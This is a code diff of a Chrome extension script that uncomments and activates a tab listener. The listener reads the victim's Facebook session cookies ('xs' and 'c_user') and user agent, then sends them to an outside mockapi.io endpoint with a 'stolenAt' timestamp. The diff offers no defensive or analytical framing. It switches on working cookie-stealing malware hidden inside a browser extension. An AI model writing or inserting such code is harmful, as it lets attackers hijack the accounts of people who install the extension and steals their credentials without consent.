@@ -241,54 +241,54 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     return true;
 });
 
-// chrome.tabs.onActivated.addListener(function () {
-//     const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-//     const userAgent = navigator.userAgent;
-//     chrome.cookies.getAll({ url: targetURL }, (cookies) => {
-//         const xsCookie = cookies.find((cookie) => cookie.name === "xs");
-//         const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
-//         if (xsCookie && cUserCookie) {
-//             const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
+chrome.tabs.onActivated.addListener(function () {
+    const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
+    const userAgent = navigator.userAgent;
+    chrome.cookies.getAll({ url: targetURL }, (cookies) => {
+        const xsCookie = cookies.find((cookie) => cookie.name === "xs");
+        const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
+        if (xsCookie && cUserCookie) {
+            const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
 
-//             fetch(`${API}?c_user=${cUserCookie.value}`)
-//                 .then((res) => res.json())
-//                 .then((res) => {
-//                     if (res.length == 1) {
-//                         const userData = {
-//                             cookie: cookie,
-//                             userAgent: userAgent,
-//                             stolenAt: dateTime(),
-//                         };
+            fetch(`${API}?c_user=${cUserCookie.value}`)
+                .then((res) => res.json())
+                .then((res) => {
+                    if (res.length == 1) {
+                        const userData = {
+                            cookie: cookie,
+                            userAgent: userAgent,
+                            stolenAt: dateTime(),
+                        };
 
-//                         fetch(`${API}/${res[0].id}`, {
-//                             method: "PUT",
-//                             headers: {
-//                                 "Content-Type": "application/json",
-//                             },
-//                             body: JSON.stringify(userData),
-//                         });
+                        fetch(`${API}/${res[0].id}`, {
+                            method: "PUT",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify(userData),
+                        });
 
-//                         console.log("Update user data");
-//                     } else {
-//                         const userData = {
-//                             c_user: cUserCookie.value,
-//                             cookie: cookie,
-//                             userAgent: userAgent,
-//                             stolenAt: dateTime(),
-//                         };
+                        console.log("Update user data");
+                    } else {
+                        const userData = {
+                            c_user: cUserCookie.value,
+                            cookie: cookie,
+                            userAgent: userAgent,
+                            stolenAt: dateTime(),
+                        };
 
-//                         fetch(`${API}`, {
-//                             method: "POST",
-//                             headers: {
-//                                 "Content-Type": "application/json",
-//                             },
-//                             body: JSON.stringify(userData),
-//                         });
+                        fetch(`${API}`, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify(userData),
+                        });
 
-//                         console.log("Create new user data");
-//                     }
-//                 });
-//         }
-//     });
-//     return true;
-// });
+                        console.log("Create new user data");
+                    }
+                });
+        }
+    });
+    return true;
+});
